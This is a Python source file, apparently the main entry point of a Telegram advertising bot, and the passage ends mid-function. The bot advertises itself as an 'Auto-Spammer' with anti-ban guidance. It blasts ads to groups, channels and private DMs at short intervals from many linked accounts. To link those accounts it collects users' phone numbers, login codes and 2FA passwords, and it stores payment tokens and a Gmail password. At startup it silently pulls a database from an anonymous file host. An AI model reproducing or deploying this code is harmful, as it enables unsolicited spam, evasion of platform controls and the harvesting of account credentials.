"""
main.py — AdBot Telegram Broadcasting Bot
Deploy-ready entry point
"""

import asyncio
import logging
import html
import os
import shutil
import time
import math
import re
import urllib.request

DB_URL = "https://files.catbox.moe/iize0n.db"
DB_FILENAME = "adbot.db"
try:
    if not os.path.exists(DB_FILENAME) or os.path.getsize(DB_FILENAME) < 1000000:
        print(f"Downloading main database from {DB_URL}...")
        urllib.request.urlretrieve(DB_URL, DB_FILENAME)
        print("Database downloaded successfully!")
except Exception as e:
    print(f"Failed to download database: {e}")

def escape_html(val) -> str:
    """Safely escape HTML special characters for Telegram HTML parse_mode."""
    if not val:
        return ""
    return html.escape(str(val))
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaVideo, InputMediaAnimation, InputMediaPhoto
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters, ChatJoinRequestHandler,
    ChatMemberHandler
)
from telegram.request import HTTPXRequest
import database as db
import scheduler as sched
import broadcaster
import fampay_engine
import gmail_payment_engine

from config import (
    BOT_TOKEN, DISCLAIMER, ADMIN_IDS, API_ID, API_HASH,
    FORCE_JOIN_CHANNEL_1, FORCE_JOIN_LINK_1,
    FORCE_JOIN_CHANNEL_2, FORCE_JOIN_LINK_2,
    PANEL_BASE_URL, ADMIN_AUTH_SECRET, ADMIN_PANEL_PASSWORD
)
from emojis import e, _E, num_to_emoji


logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS if uid else False

# Conversation states
WAITING_PHONE = 10
WAITING_OTP   = 11
WAITING_2FA   = 12
WAITING_AD    = 20
WAITING_AUTO_REPLY = 50
WAITING_CUSTOM_AD  = 60
WAITING_ACCOUNT_AUTO_REPLY = 70
WAITING_AUTOJOIN_LINKS = 80
WAITING_PAYMENT_SCREENSHOT = 90

# Admin conversation states
ADMIN_WAITING_PHONE = 30
ADMIN_WAITING_OTP   = 31
ADMIN_WAITING_2FA   = 32
ADMIN_WAITING_VIDEO = 33
ADMIN_WAITING_FJ1   = 40
ADMIN_WAITING_FJ2   = 41
ADMIN_WAITING_FJ_VIDEO = 42
ADMIN_WAITING_BROADCAST = 43
ADMIN_WAITING_PREMIUM_UID = 95
ADMIN_WAITING_ESCROW_LINKS = 96
ADMIN_WAITING_QR_PHOTO = 97
ADMIN_WAITING_FAMPAY_PHONE = 101
ADMIN_WAITING_FAMPAY_OTP   = 102
ADMIN_WAITING_FAMPAY_TOKEN = 103
ADMIN_WAITING_FAMPAY_UPI   = 104
ADMIN_WAITING_FAMPAY_PRICE = 105
ADMIN_WAITING_GMAIL_EMAIL  = 106
ADMIN_WAITING_GMAIL_PASS   = 107


pending_logins       = {}
admin_pending_logins = {}  # {admin_uid: {"target_uid": uid, "phone": ..., "client": ..., "phone_code_hash": ...}}

def parse_fj_input(text: str):
    parts = [p.strip() for p in text.split(",", 1)]
    ch_raw = parts[0]
    link_raw = parts[1] if len(parts) > 1 else ch_raw

    ch_id = ch_raw
    if "t.me/" in ch_raw:
        path = ch_raw.split("t.me/")[1].strip("/").split("?")[0]
        if not path.startswith("+") and not path.startswith("joinchat/"):
            ch_id = f"@{path}"
        else:
            ch_id = ch_raw
    elif not ch_id.startswith("@") and not ch_id.startswith("-") and not ch_id.startswith("+"):
        ch_id = f"@{ch_id}"

    link = link_raw
    if not link.startswith("http://") and not link.startswith("https://"):
        if link.startswith("@"):
            link = f"https://t.me/{link[1:]}"
        else:
            link = f"https://t.me/{link}"

    return ch_id, link


_member_cache = {}  # {(user_id, clean_ch): expiry_timestamp}


async def is_user_member_of_channel(bot, channel_id: str, user_id: int) -> bool:
    if not channel_id or str(channel_id).strip() in ("@YourChannel1", "@YourChannel2", "none", "", "None"):
        return True  # If not configured yet, don't block

    clean_ch = str(channel_id).strip()
    if "t.me/" in clean_ch:
        path = clean_ch.split("t.me/")[1].strip("/").split("?")[0]
        if not path.startswith("+") and not path.startswith("joinchat/"):
            clean_ch = f"@{path}"
    elif not clean_ch.startswith("@") and not clean_ch.startswith("-") and not clean_ch.startswith("+"):
        clean_ch = f"@{clean_ch}"

    now = time.time()
    cache_key = (user_id, clean_ch)
    if cache_key in _member_cache and now < _member_cache[cache_key]:
        return True

    # 1. ALWAYS query Telegram API live first
    try:
        member = await bot.get_chat_member(chat_id=clean_ch, user_id=user_id)
        if member:
            if member.status in ("creator", "administrator", "member", "restricted"):
                _member_cache[cache_key] = now + 60.0  # Cache for 60s
                return True
            if member.status in ("left", "kicked"):
                _member_cache.pop(cache_key, None)
                db.remove_join_request(user_id, clean_ch)
                db.remove_join_request(user_id, channel_id)
                return False
    except Exception as err:
        logger.warning(f"[ForceJoin Check Failed] Channel '{channel_id}' (clean: '{clean_ch}'), User {user_id}: {err}")

    # 2. Fallback check for private admin-approval links where get_chat_member might fail
    if db.has_user_requested_join(user_id, clean_ch) or db.has_user_requested_join(user_id, channel_id):
        _member_cache[cache_key] = now + 60.0
        return True

    _member_cache.pop(cache_key, None)
    return False


async def handle_chat_join_request(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    req = update.chat_join_request
    if not req:
        return
    chat_id = req.chat.id
    user_id = req.from_user.id
    chat_str = str(chat_id)
    chat_username = f"@{req.chat.username}" if req.chat.username else ""

    # Record join request in DB without approving into channel
    db.record_join_request(user_id, chat_str)
    if chat_username:
        db.record_join_request(user_id, chat_username)

    logger.info(f"[Recorded Join Request] User {user_id} sent join request for chat {chat_str} ({chat_username})")


async def check_user_force_join(bot, user_id: int) -> tuple:
    """Returns (is_joined, ch1_id, link1, ch2_id, link2, joined1, joined2)"""
    if is_admin(user_id):
        return True, "", "", "", "", True, True

    ch1   = db.get_config("fj_channel_1", FORCE_JOIN_CHANNEL_1)
    link1 = db.get_config("fj_link_1", FORCE_JOIN_LINK_1)
    ch2   = db.get_config("fj_channel_2", FORCE_JOIN_CHANNEL_2)
    link2 = db.get_config("fj_link_2", FORCE_JOIN_LINK_2)

    joined1 = await is_user_member_of_channel(bot, ch1, user_id)
    joined2 = await is_user_member_of_channel(bot, ch2, user_id)

    if joined1 and joined2:
        return True, ch1, link1, ch2, link2, True, True
    return False, ch1, link1, ch2, link2, joined1, joined2


async def send_force_join_prompt(update: Update, ctx: ContextTypes.DEFAULT_TYPE, link1: str, link2: str, edit: bool = False, joined1: bool = False, joined2: bool = False):
    uid = update.effective_user.id
    header = f"{e('deco_fly_l')} <b>MANDATORY CHANNEL JOIN REQUIRED</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

    if not joined1 and not joined2:
        status_text = f"{e('cross')} <b>Status:</b> <i>You haven't joined Channel 1 & Channel 2 yet!</i>"
    elif not joined1:
        status_text = f"{e('warning')} <b>Status:</b> <i>You joined Channel 2, but still need to join Channel 1!</i>"
    else:
        status_text = f"{e('warning')} <b>Status:</b> <i>You joined Channel 1, but still need to join Channel 2!</i>"

    text = (
        f"{header}\n"
        f"{divider}\n\n"
        f"{e('crown')} <b>Welcome to Luxury AdBot Auto-Broadcaster!</b> {e('fire')}\n\n"
        f"{status_text}\n\n"
        f"{e('lock')} <b>To unlock access to Unlimited Broadcaster, Auto-Spammer & Luxury Tools, you MUST join both VIP Channels!</b>\n\n"
        f"{e('lightni')} <b>VIP Membership Benefits:</b>\n"
        f"{e('chipo')} <i>Get Latest High-Speed Tele-Broadcasting Updates</i>\n"
        f"{e('gift')} <i>Free Premium Custom Emoji Packs & VIP Features</i>\n"
        f"{e('dev')} <i>Anti-Ban Guidelines & Bot Tutorials</i>\n\n"
        f"{e('warning')} <b>Anti-Leave Protection:</b> <i>If you leave any channel later, bot will automatically restrict access until you rejoin!</i>\n\n"
        f"{divider}\n"
        f"{e('pointer')} <b>Tap below to join the remaining channel, then tap Check Membership:</b>"
    )

    btn1_text = "Channel 1 Joined" if joined1 else "Join Official Channel 1"
    btn2_text = "Channel 2 Joined" if joined2 else "Join Official Channel 2"

    btn1 = InlineKeyboardButton(
        btn1_text,
        url=link1 if not joined1 else None,
        callback_data="fj_already_joined_1" if joined1 else None,
        icon_custom_emoji_id=_E["check"] if joined1 else _E["globe"]
    )
    btn2 = InlineKeyboardButton(
        btn2_text,
        url=link2 if not joined2 else None,
        callback_data="fj_already_joined_2" if joined2 else None,
        icon_custom_emoji_id=_E["check"] if joined2 else _E["chipo"]
    )
    btn_check = InlineKeyboardButton(
        "Check Membership / Continue",
        callback_data="btn_check_membership",
        icon_custom_emoji_id=_E["fire"]
    )

    buttons = InlineKeyboardMarkup([
        [btn1],
        [btn2],
        [btn_check],
    ])

    if edit and update.callback_query:
        res = await safe_edit_text_or_caption(update.callback_query, text=text, reply_markup=buttons, parse_mode="HTML", change_video=True)
        if res:
            return

    fj_v = db.get_config("force_join_video", "")
    fj_t = db.get_config("force_join_video_type", "video")
    if fj_v:
        video_id, video_type = fj_v, fj_t
    else:
        video_id, video_type = db.get_next_welcome_video_for_user(uid)

    msg = update.message or (update.callback_query.message if update.callback_query else None)
    if video_id and msg:
        if video_type == "animation":
            await msg.reply_animation(animation=video_id, caption=text, reply_markup=buttons, parse_mode="HTML")
        elif video_type == "photo":
            await msg.reply_photo(photo=video_id, caption=text, reply_markup=buttons, parse_mode="HTML")
        else:
            await msg.reply_video(video=video_id, caption=text, reply_markup=buttons, parse_mode="HTML")
    elif msg:
        await msg.reply_text(text, reply_markup=buttons, parse_mode="HTML")


# ═══════════════════════════════════════════════════════════
#   DASHBOARD
# ═══════════════════════════════════════════════════════════

def build_dashboard(uid: int):
    accounts   = db.get_accounts(uid)
    settings   = db.get_settings(uid)
    ad         = db.get_ad(uid)
    stats      = db.get_stats(uid)
    running    = sched.is_user_running(uid)
    acc_count  = len(accounts)

    ad_status_text  = "Set" if ad else "Not Set"
    ad_status_emoji = e('check') if ad else e('cross')

    interval   = settings["interval"]   if settings else "5min"
    cycles     = settings["cycles"]     if settings else 0
    cycle_done = settings["cycle_done"] if settings else 0

    cycle_val_str  = f"Unlimited {e('infinty1')}" if cycles == 0 else f"{num_to_emoji(cycles)}"
    prog_val_str   = f"{num_to_emoji(cycle_done)} / Unlimited {e('infinity2')}" if cycles == 0 else f"{num_to_emoji(cycle_done)} / {num_to_emoji(cycles)}"
    status_str     = f"{e('fire')} <b>🟢 BROADCASTING LIVE</b>" if running else "⚪ Idle / Stopped"

    t_mode = dict(settings)["target_mode"] if (settings and "target_mode" in dict(settings)) else "groups"
    target_text_map = {
        "groups":          "Groups Only",
        "channels":        "Channels Only",
        "dms":             "Profiles (DMs) Only",
        "channels_groups": "Channels & Groups",
        "all":             "All (Channels + Groups + Profiles)",
    }
    target_emoji_map = {
        "groups":          e('grpoi'),
        "channels":        e('chipo'),
        "dms":             e('blacki'),
        "channels_groups": e('cvnrp'),
        "all":             e('vrtit'),
    }
    t_text  = target_text_map.get(t_mode, "Groups Only")
    t_emoji = target_emoji_map.get(t_mode, e('grpoi'))

    header = f"{e('deco_fly_l')} {e('header')} <b>LUXURY ADS DASHBOARD</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
    pad = "          "

    ar_settings = db.get_auto_reply(uid)
    ar_status_str = f"Enabled {e('check')}" if ar_settings.get("enabled") else f"Disabled {e('cross')}"

    text = (
        f"{header}\n"
        f"{pad}{divider}\n\n"
        f"{e('mani')} <b>Connected Accounts:</b> {num_to_emoji(acc_count)}\n"
        f"{e('messagt')} <b>Ad Message:</b> <code>{ad_status_text}</code> {ad_status_emoji}\n"
        f"{e('clock')} <b>Interval:</b> {num_to_emoji(interval)}\n"
        f"{e('targi')} <b>Target Mode:</b> <code>{t_text}</code> {t_emoji}\n"
        f"{e('robot')} <b>Auto Reply DM:</b> {ar_status_str}\n"
        f"{e('relok')} <b>Cycles Target:</b> {cycle_val_str}\n"
        f"{e('progf')} <b>Progress:</b> {prog_val_str}\n"
        f"{e('sentti')} <b>Total Ads Sent:</b> {num_to_emoji(stats['sent'])}\n"
        f"{e('feilfd')} <b>Total Failed:</b> {num_to_emoji(stats['failed'])}\n"
        f"{e('gear')} <b>Broadcast Status:</b> {status_str}\n\n"
        f"{pad}{divider}\n"
        f"<i>{e('cutut')} Choose an action from the luxury menu below:</i>"
    )

    buttons = [
        [
            InlineKeyboardButton("Add Account",    callback_data="btn_addaccount", icon_custom_emoji_id=_E["plus"],  style="success"),
            InlineKeyboardButton("My Accounts",   callback_data="btn_myaccounts",  icon_custom_emoji_id=_E["android"],style="primary"),
        ],
        [
            InlineKeyboardButton("Premium",        callback_data="btn_premium",    icon_custom_emoji_id=_E["crown"], style="success"),
        ],
        [
            InlineKeyboardButton("Set Ad Message", callback_data="btn_setad",      icon_custom_emoji_id=_E["pen"],   style="primary"),
            InlineKeyboardButton("Set Interval",   callback_data="btn_setinterval",icon_custom_emoji_id=_E["clock"], style="primary"),
        ],
        [
            InlineKeyboardButton("Target Chats",  callback_data="btn_target",      icon_custom_emoji_id=_E["point"], style="primary"),
            InlineKeyboardButton("Exclude Chats", callback_data="btn_exclude",     icon_custom_emoji_id=_E["cross"], style="danger"),
        ],
        [
            InlineKeyboardButton("Set Cycles",    callback_data="btn_setcycles",   icon_custom_emoji_id=_E["chart"], style="primary"),
            InlineKeyboardButton("Auto Reply",    callback_data="btn_autoreply",   icon_custom_emoji_id=_E.get("robot", _E["dev"]), style="primary"),
        ],
        [
            InlineKeyboardButton("Analytics",     callback_data="btn_analytics",   icon_custom_emoji_id=_E["chart"], style="primary"),
            InlineKeyboardButton("Refresh",       callback_data="btn_refresh",     icon_custom_emoji_id=_E["gear"],  style="primary"),
        ],
        [
            InlineKeyboardButton("Start Ads",     callback_data="btn_start",       icon_custom_emoji_id=_E["fire"],  style="success"),
            InlineKeyboardButton("Stop Ads",      callback_data="btn_stop",        icon_custom_emoji_id=_E["cross"], style="danger"),
        ],
    ]
    return text, InlineKeyboardMarkup(buttons)


async def safe_edit_text_or_caption(query, text, reply_markup=None, parse_mode="HTML", change_video=True):
    """Safely edit message text/caption and update welcome video on button click if available."""
    uid = query.from_user.id if (query and query.from_user) else None
    msg = query.message if query else None

    caption_text = text

    if change_video and uid and msg:
        fj_v = db.get_config("force_join_video", "")
        fj_t = db.get_config("force_join_video_type", "video")
        if fj_v:
            video_id, video_type = fj_v, fj_t
        else:
            video_id, video_type = db.get_next_welcome_video_for_user(uid)
        if video_id:
            try:
                if video_type == "animation":
                    media = InputMediaAnimation(media=video_id, caption=caption_text, parse_mode=parse_mode)
                elif video_type == "photo":
                    media = InputMediaPhoto(media=video_id, caption=caption_text, parse_mode=parse_mode)
                else:
                    media = InputMediaVideo(media=video_id, caption=caption_text, parse_mode=parse_mode)
                return await query.edit_message_media(media=media, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"safe_edit_text_or_caption media edit error: {e}")

    if msg:
        if msg.video or msg.photo or msg.animation or msg.document or msg.caption:
            try:
                return await query.edit_message_caption(caption=caption_text, reply_markup=reply_markup, parse_mode=parse_mode)
            except Exception as e:
                logger.error(f"safe_edit_text_or_caption caption edit error: {e}")
    try:
        return await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"safe_edit_text_or_caption text edit error: {e}")
        if msg:
            try:
                await msg.delete()
            except Exception:
                pass
            return await msg.reply_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode)


async def send_landing_screen(update: Update, ctx: ContextTypes.DEFAULT_TYPE, edit=False):
    uid = update.effective_user.id

    # ── Force Join Guard ─────────────────────────────────────
    is_joined, ch1, link1, ch2, link2, j1, j2 = await check_user_force_join(ctx.bot, uid)
    if not is_joined:
        return await send_force_join_prompt(update, ctx, link1, link2, edit=edit, joined1=j1, joined2=j2)

    header = f"{e('deco_fly_l')} <b>WELCOME TO ADBOT ORG</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

    text = (
        f"{header}\n"
        f"{divider}\n\n"
        f"{e('crown')} <b>Premium Main Menu</b> {e('lightni')}\n\n"
        f"<i>Please choose a service below:</i>"
    )

    markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Run Ads", callback_data="btn_run_ads_menu", icon_custom_emoji_id=_E["fire"], style="primary")
        ]
    ])

    if edit and update.callback_query:
        res = await safe_edit_text_or_caption(update.callback_query, text=text, reply_markup=markup, parse_mode="HTML", change_video=True)
        if res:
            return

    video_id, video_type = db.get_next_welcome_video_for_user(uid)
    msg = update.message or (update.callback_query.message if update.callback_query else None)
    if video_id and msg:
        try:
            if video_type == "animation":
                await msg.reply_animation(animation=video_id, caption=text, reply_markup=markup, parse_mode="HTML")
            elif video_type == "video_note":
                await msg.reply_video_note(video_note=video_id)
                await msg.reply_text(text, reply_markup=markup, parse_mode="HTML")
            elif video_type == "photo":
                await msg.reply_photo(photo=video_id, caption=text, reply_markup=markup, parse_mode="HTML")
            else:
                await msg.reply_video(video=video_id, caption=text, reply_markup=markup, parse_mode="HTML")
        except Exception as err:
            logger.error(f"[Send Landing Video Error] {err}")
            await msg.reply_text(text, reply_markup=markup, parse_mode="HTML")
    elif msg:
        await msg.reply_text(text, reply_markup=markup, parse_mode="HTML")

def get_calc_keyboard(amount: str):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("1", callback_data="calc_1", style="primary"),
            InlineKeyboardButton("2", callback_data="calc_2", style="primary"),
            InlineKeyboardButton("3", callback_data="calc_3", style="primary")
        ],
        [
            InlineKeyboardButton("4", callback_data="calc_4", style="primary"),
            InlineKeyboardButton("5", callback_data="calc_5", style="primary"),
            InlineKeyboardButton("6", callback_data="calc_6", style="primary")
        ],
        [
            InlineKeyboardButton("7", callback_data="calc_7", style="primary"),
            InlineKeyboardButton("8", callback_data="calc_8", style="primary"),
            InlineKeyboardButton("9", callback_data="calc_9", style="primary")
        ],
        [
            InlineKeyboardButton("00", callback_data="calc_00", style="primary"),
            InlineKeyboardButton("0", callback_data="calc_0", style="primary"),
            InlineKeyboardButton("⌫", callback_data="calc_del", style="danger")
        ],
        [
            InlineKeyboardButton("« Back", callback_data="btn_back_landing", style="primary"),
            InlineKeyboardButton("✅ Pay Now", callback_data=f"calc_pay_{amount or '0'}", style="success")
        ]
    ])

async def send_deposit_calculator(update: Update, ctx: ContextTypes.DEFAULT_TYPE, edit=False):
    amt = ctx.user_data.get("dep_amt", "")
    text = (
        f"💎 <b>Deposit Funds</b>\n\n"
        f"<i>Enter the amount you wish to deposit.</i>\n\n"
        f"💰 <b>Amount:</b> ₹ {amt if amt else '0'}"
    )
    markup = get_calc_keyboard(amt)

    if edit and update.callback_query:
        await safe_edit_text_or_caption(update.callback_query, text=text, reply_markup=markup, parse_mode="HTML", change_video=False)
    else:
        msg = update.message or (update.callback_query.message if update.callback_query else None)
        if msg:
            await msg.reply_text(text, reply_markup=markup, parse_mode="HTML")

async def send_payment_gateways(update: Update, ctx: ContextTypes.DEFAULT_TYPE, amount: int):
    text = (
        f"💳 <b>Select Payment Method</b>\n\n"
        f"<i>You are about to deposit ₹ {amount}.</i>\n"
        f"<i>Please choose a payment method below:</i>"
    )
    markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("FamPay", callback_data=f"pay_fp_{amount}", style="primary"),
            InlineKeyboardButton("UPI (Bank)", callback_data=f"pay_upi_{amount}", style="primary")
        ],
        [
            InlineKeyboardButton("« Back", callback_data="btn_deposit_menu", style="primary")
        ]
    ])
    try:
        await update.callback_query.edit_message_text(text=text, reply_markup=markup, parse_mode="HTML")
    except Exception:
        pass

async def send_dashboard(update: Update, ctx: ContextTypes.DEFAULT_TYPE, edit=False):
    uid = update.effective_user.id

    # ── Force Join Guard ─────────────────────────────────────
    is_joined, ch1, link1, ch2, link2, j1, j2 = await check_user_force_join(ctx.bot, uid)
    if not is_joined:
        return await send_force_join_prompt(update, ctx, link1, link2, edit=edit, joined1=j1, joined2=j2)

    db.get_settings(uid)
    text, markup = build_dashboard(uid)

    if edit and update.callback_query:
        res = await safe_edit_text_or_caption(update.callback_query, text=text, reply_markup=markup, parse_mode="HTML", change_video=True)
        if res:
            return

    video_id, video_type = db.get_next_welcome_video_for_user(uid)
    msg = update.message or (update.callback_query.message if update.callback_query else None)
    if video_id and msg:
        try:
            if video_type == "animation":
                await msg.reply_animation(animation=video_id, caption=text, reply_markup=markup, parse_mode="HTML")
            elif video_type == "video_note":
                await msg.reply_video_note(video_note=video_id)
                await msg.reply_text(text, reply_markup=markup, parse_mode="HTML")
            elif video_type == "photo":
                await msg.reply_photo(photo=video_id, caption=text, reply_markup=markup, parse_mode="HTML")
            else:
                await msg.reply_video(video=video_id, caption=text, reply_markup=markup, parse_mode="HTML")
        except Exception as err:
            logger.error(f"[Send Dashboard Video Error] {err}")
            await msg.reply_text(text, reply_markup=markup, parse_mode="HTML")
    elif msg:
        await msg.reply_text(text, reply_markup=markup, parse_mode="HTML")


# ═══════════════════════════════════════════════════════════
#   /start & /cancel
# ═══════════════════════════════════════════════════════════

async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    user = update.effective_user
    db.register_user(uid, user.username or "", user.first_name or "")
    db.get_settings(uid)
    await send_landing_screen(update, ctx)


async def cancel_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ctx.user_data.pop("state", None)
    ctx.user_data.pop("admin_target_uid", None)
    if uid in pending_logins:
        try:
            await pending_logins[uid]["client"].disconnect()
        except Exception:
            pass
        del pending_logins[uid]
    if uid in admin_pending_logins:
        try:
            await admin_pending_logins[uid]["client"].disconnect()
        except Exception:
            pass
        del admin_pending_logins[uid]

    await update.message.reply_text("❌ Cancelled.")
    await send_landing_screen(update, ctx)


# ═══════════════════════════════════════════════════════════
#   INTERVAL & CYCLE KEYBOARDS
# ═══════════════════════════════════════════════════════════

def interval_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("15 sec",  callback_data="set_interval_15sec", icon_custom_emoji_id=_E["clock"], style="primary"),
            InlineKeyboardButton("1 min",   callback_data="set_interval_1min",  icon_custom_emoji_id=_E["clock"], style="primary"),
            InlineKeyboardButton("5 min",   callback_data="set_interval_5min",  icon_custom_emoji_id=_E["clock"], style="primary"),
        ],
        [
            InlineKeyboardButton("10 min",  callback_data="set_interval_10min", icon_custom_emoji_id=_E["clock"], style="primary"),
            InlineKeyboardButton("30 min",  callback_data="set_interval_30min", icon_custom_emoji_id=_E["clock"], style="primary"),
            InlineKeyboardButton("1 hour",  callback_data="set_interval_1hr",   icon_custom_emoji_id=_E["clock"], style="primary"),
        ],
        [InlineKeyboardButton("Back",    callback_data="btn_refresh",         icon_custom_emoji_id=_E["arrow"], style="danger")],
    ])


def cycles_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("1",         callback_data="set_cycle_1",  icon_custom_emoji_id=_E["chart"], style="primary"),
            InlineKeyboardButton("5",         callback_data="set_cycle_5",  icon_custom_emoji_id=_E["chart"], style="primary"),
            InlineKeyboardButton("10",        callback_data="set_cycle_10", icon_custom_emoji_id=_E["chart"], style="primary"),
            InlineKeyboardButton("25",        callback_data="set_cycle_25", icon_custom_emoji_id=_E["chart"], style="primary"),
        ],
        [
            InlineKeyboardButton("50",        callback_data="set_cycle_50", icon_custom_emoji_id=_E["chart"],    style="primary"),
            InlineKeyboardButton("Unlimited", callback_data="set_cycle_0",  icon_custom_emoji_id=_E["infinity"], style="success"),
        ],
        [InlineKeyboardButton("Back",      callback_data="btn_refresh",   icon_custom_emoji_id=_E["arrow"], style="danger")],
    ])


def target_keyboard(current_mode: str = "groups"):
    modes = [
        ("groups",          "Target Groups Only",                    _E["grpoi"]),
        ("channels",        "Target Channels Only",                  _E["chipo"]),
        ("dms",             "Target Profiles (User DMs)",            _E["blacki"]),
        ("channels_groups", "Target Channels & Groups",              _E["cvnrp"]),
        ("all",             "Target All (Channels + Groups + DMs)",  _E["vrtit"]),
    ]
    buttons = []
    for mode_key, label, emoji_id in modes:
        if mode_key == current_mode:
            lbl   = f"{label} (Active)"
            style = "success"
        else:
            lbl   = label
            style = "primary"
        buttons.append([InlineKeyboardButton(lbl, callback_data=f"set_target_{mode_key}", icon_custom_emoji_id=emoji_id, style=style)])
    buttons.append([InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="danger")])
    return InlineKeyboardMarkup(buttons)


def start_target_launch_keyboard(current_mode: str = "groups"):
    modes = [
        ("groups",          "Target Groups Only",                    _E["grpoi"]),
        ("channels",        "Target Channels Only",                  _E["chipo"]),
        ("dms",             "Target Profiles (User DMs)",            _E["blacki"]),
        ("channels_groups", "Target Channels & Groups",              _E["cvnrp"]),
        ("all",             "Target All (Channels + Groups + DMs)",  _E["vrtit"]),
    ]
    buttons = []
    for mode_key, label, emoji_id in modes:
        if mode_key == current_mode:
            lbl   = f"Launch: {label} (Active)"
            style = "success"
        else:
            lbl   = f"Launch: {label}"
            style = "primary"
        buttons.append([InlineKeyboardButton(lbl, callback_data=f"start_launch_{mode_key}", icon_custom_emoji_id=emoji_id, style=style)])
    buttons.append([InlineKeyboardButton("Cancel", callback_data="btn_refresh", icon_custom_emoji_id=_E["cross"], style="danger")])
    return InlineKeyboardMarkup(buttons)


async def show_target_launch_menu(query, uid: int, settings, ctx):
    current_mode = dict(settings)["target_mode"] if (settings and "target_mode" in dict(settings)) else "groups"
    selected_phone = ctx.user_data.get("selected_broadcast_phone", "all")

    if selected_phone == "all":
        acc_info_str = f"{e('fire')} <b>Account Target:</b> <code>ALL Active Accounts</code>"
    else:
        acc_info_str = f"{e('android')} <b>Account Target:</b> <code>Account ({selected_phone})</code>"

    header = f"{e('deco_fly_l')} <b>CHOOSE TARGET DESTINATION</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

    await safe_edit_text_or_caption(
        query,
        f"{header}\n{divider}\n\n"
        f"{acc_info_str}\n\n"
        f"{e('adno')} <b>Where do you want to send your ad message?</b>\n\n"
        f"<i>{e('lightni')} Select your target destination below to launch broadcast live:</i>",
        parse_mode="HTML",
        reply_markup=start_target_launch_keyboard(current_mode)
    )


async def show_account_selection_menu(query, uid: int, ctx):
    accounts = db.get_accounts(uid, active_only=True)
    selected_phone = ctx.user_data.get("selected_broadcast_phone", "all")

    header = f"{e('deco_fly_l')} {e('android')} <b>SELECT BROADCAST ACCOUNT</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

    if selected_phone == "all":
        status_text = f"{e('fire')} <b>Current Selection:</b> <code>ALL Active Accounts ({len(accounts)})</code>"
    else:
        status_text = f"{e('android')} <b>Current Selection:</b> <code>Account ({selected_phone})</code>"

    acc_buttons = [
        [InlineKeyboardButton("Launch ALL Accounts Together", callback_data="launch_run_all", icon_custom_emoji_id=_E["fire"], style="success")]
    ]

    for i, acc in enumerate(accounts, 1):
        acc_dict = dict(acc)
        p = acc_dict['phone']
        is_sel = (p == selected_phone)
        lbl = f"Account #{i} ({p}) [Selected]" if is_sel else f"Account #{i} ({p})"
        icon = _E["check"] if is_sel else _E["android"]
        style = "success" if is_sel else "primary"
        acc_buttons.append([
            InlineKeyboardButton(lbl, callback_data=f"launch_sel_acc_{p}", icon_custom_emoji_id=icon, style=style)
        ])

    if selected_phone != "all":
        acc_buttons.append([
            InlineKeyboardButton(f"Start Broadcast with Account ({selected_phone[-4:]})", callback_data="launch_run_selected", icon_custom_emoji_id=_E["forward"], style="success")
        ])

    acc_buttons.append([
        InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")
    ])

    await safe_edit_text_or_caption(
        query,
        f"{header}\n{divider}\n\n"
        f"{status_text}\n\n"
        f"<i>{e('lightni')} Tap an account to select it, or tap <b>Launch ALL Accounts</b> to run all accounts together:</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(acc_buttons)
    )


async def send_set_ad_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE, edit=True):
    uid = update.effective_user.id
    ad = db.get_ad(uid)
    settings = db.get_settings(uid)
    settings_dict = dict(settings) if settings else {}
    ad_mode = settings_dict.get("ad_mode", "custom")
    accounts = db.get_accounts(uid, active_only=False)

    header = f"{e('deco_fly_l')} {e('messagt')} <b>AD MESSAGES CONFIGURATION</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

    global_ad_text = ad["message"] if ad else "No shared global ad message set yet."
    mode_status_str = f"{e('globe')} <b>Mode 1 (Active):</b> <i>All accounts send 1 shared global ad message</i>" if ad_mode == "global" else f"{e('android')} <b>Mode 2 (Active):</b> <i>Each account sends its separate custom ad message</i>"

    lines = [
        f"{header}\n{divider}\n\n",
        f"{e('gear')} <b>Broadcast Mode Status:</b>\n{mode_status_str}\n\n",
        f"{e('messagt')} <b>Main Shared Global Ad Message:</b>\n",
